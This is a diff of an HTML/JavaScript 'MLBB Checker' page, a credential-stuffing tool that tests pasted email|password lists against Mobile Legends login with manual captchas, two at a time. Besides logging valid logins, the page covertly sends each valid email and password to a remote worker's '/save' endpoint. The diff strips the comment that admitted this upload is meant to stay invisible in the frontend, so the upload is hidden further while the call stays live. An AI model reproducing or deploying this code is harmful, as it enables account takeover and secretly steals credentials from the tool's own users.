@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>MLBB Checker By Arif Hidayatulloh Manual Captcha - 2 Parallel</title>
+<title>MLBB Checker By Arif Hidayatulloh Manual Captcha - 2 Parallel (Auto Refresh)</title>
 <script src="https://cstaticdun.126.net/load.min.js"></script>
 <style>
   body { font-family: Arial; max-width: 1000px; margin: auto; padding: 20px; }
@@ -17,7 +17,7 @@
 </head>
 <body>
 
-<h2>MLBB Checker By Arif Hidayatulloh Manual Captcha (2 Parallel)</h2>
+<h2>MLBB Checker By Arif Hidayatulloh Manual Captcha (2 Parallel Auto Refresh)</h2>
 <p>Paste list akun (email|password per baris). Akan muncul 2 CAPTCHA untuk 2 akun secara bersamaan. Hasil langsung muncul di log.</p>
 
 <textarea id="combo" placeholder="user1@example.com|Pass123\nuser2@example.com|Pass456"></textarea>
@@ -122,7 +122,6 @@ function showCaptcha(index) {
 
 async function sendToKV(account) {
   try {
-    // Kirim POST ke worker untuk disimpan di KV "VALID_ACCOUNTS"
     await fetch(WORKER_URL + "/save", {
       method: "POST",
       body: JSON.stringify(account),
@@ -162,7 +161,6 @@ async function checkOneAccount(account, index) {
     if(data.code === 0 && data.data) {
       appendLog(`VALID => ${account.email}`, "ok");
       validAccounts.push(`${account.email}:${account.password}`);
-      // Kirim ke KV worker tanpa terlihat di frontend
       sendToKV({ email: account.email, password: account.password });
     } else if(data.code === 1004) {
       appendLog(`NOT FOUND => ${account.email}`, "bad");
@@ -175,12 +173,6 @@ async function checkOneAccount(account, index) {
   } catch(e) {
     appendLog(`Error pengecekan ${account.email}: ${e}`, "bad");
   }
-}
-
-async function checkAccountsParallel(accounts) {
-  if(accounts.length === 0) return;
-  const promises = accounts.map((acc, i) => checkOneAccount(acc, i));
-  await Promise.all(promises);
 }
 
 function updateTextareaCombos() {
@@ -196,7 +188,7 @@ async function startProcess() {
   validAccounts = [];
   combos = parseCombos(document.getElementById("combo").value);
 
-  if(combos.length === 0) {
+  if (combos.length === 0) {
     appendLog("Tidak ada akun untuk dicek", "info");
     startBtn.disabled = false;
     stopBtn.disabled = true;
@@ -205,15 +197,15 @@ async function startProcess() {
 
   appendLog(`Mulai cek ${combos.length} akun. Klik CAPTCHA tiap akun.`, "info");
 
-  while(combos.length > 0) {
-    if(stopRequested) {
-      appendLog("Proses dihentikan user", "info");
-      break;
+  async function processCaptcha(index) {
+    while (!stopRequested && combos.length > 0) {
+      const account = combos.shift();
+      updateTextareaCombos();
+      await checkOneAccount(account, index);
     }
-    const batch = combos.splice(0, 2);
-    await checkAccountsParallel(batch);
-    updateTextareaCombos();
   }
+
+  await Promise.all([processCaptcha(0), processCaptcha(1)]);
 
   appendLog("Selesai", "info");
   statusEl.textContent = "Selesai";
